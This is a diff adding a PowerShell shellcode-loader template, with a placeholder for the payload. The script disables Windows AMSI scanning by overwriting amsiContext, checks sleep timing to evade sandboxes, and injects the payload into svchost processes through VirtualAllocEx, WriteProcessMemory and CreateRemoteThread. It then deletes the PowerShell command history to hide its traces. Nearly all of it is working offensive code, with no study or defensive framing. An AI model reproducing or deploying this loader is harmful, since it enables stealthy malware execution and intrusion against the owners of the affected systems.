@@ -1,0 +1,69 @@
+//####CODE####
+
+$my_dbg=$false
+function LookupFunc {
+ Param ($moduleName, $functionName)
+ $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+ $tmp=@()
+ $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+ return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+//####EVASION####
+
+function getDelegateType {
+ Param (
+ [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+ [Parameter(Position = 1)] [Type] $delType = [Void]
+ )
+ $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+ $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+ $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+ return $type.CreateType()
+}
+
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne 0){if($my_dbg){Write-Host "[+] Found 4m5iCtx"};[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);if($my_dbg){Write-Host "[+] Overwrote 4m5iCtx"}}
+$starttime = Get-Date -Displayhint Time
+Start-sleep -s 5
+$finishtime = Get-Date -Displayhint Time
+if ( $finishtime -le $starttime.addseconds(4.5) ) {
+  if($my_dbg){Write-Host "[-] Sl33p timing is off, something is sus, exiting >:("};exit
+}
+
+[Byte[]] $buf = ####SHELLCODE####
+
+//####CALL####
+
+$user=[Security.Principal.WindowsIdentity]::GetCurrent(); $isBoss=(New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+if($isBoss){$procs=(Get-Process svchost -IncludeUserName | Where-Object {$_.UserName -eq "NT AUTHORITY\SYSTEM"}); if($procs.Length -eq 0){$procs=(Get-Process svchost | Where-Object {$_.Path -ne $null})}} else{$procs=(Get-Process svchost | Where-Object {$_.Path -ne $null})}
+
+ForEach($proc in $procs){
+  $hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $proc.Id)
+  if($hprocess -ne 0){
+    if($my_dbg){Write-Host "[+] Successfully opened $($proc.name),$($proc.id)"}
+    $addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hprocess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40);
+    if($addr -eq 0){
+      if($my_dbg){Write-Host "[-] Unable to alloc Mem"}
+      continue
+    }
+    if($my_dbg){Write-Host "[+] Successfully allocd Mem"}
+
+    [Int32]$lpNumberOfBytesWritten = 0
+    $ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addr, $buf, $buf.length, [ref]$lpNumberOfBytesWritten)
+    if(!$ret){
+      if($my_dbg){Write-Host "[-] Unable to write Mem"}
+      continue
+    }
+    if($my_dbg){Write-Host "[+] Successfully wrote Mem"}
+
+    $ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
+    if($ret -eq 0){
+      if($my_dbg){Write-Host "[-] Unable to create thr34d"}
+      continue
+    }
+    if($my_dbg){Write-Host "[+] Successfully made thr34d"}
+    break
+  }
+  if($my_dbg){Write-Host "[-] Unable to open $($proc.name),$($proc.id)"}
+}
+Remove-Item "$Env:APPDATA\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
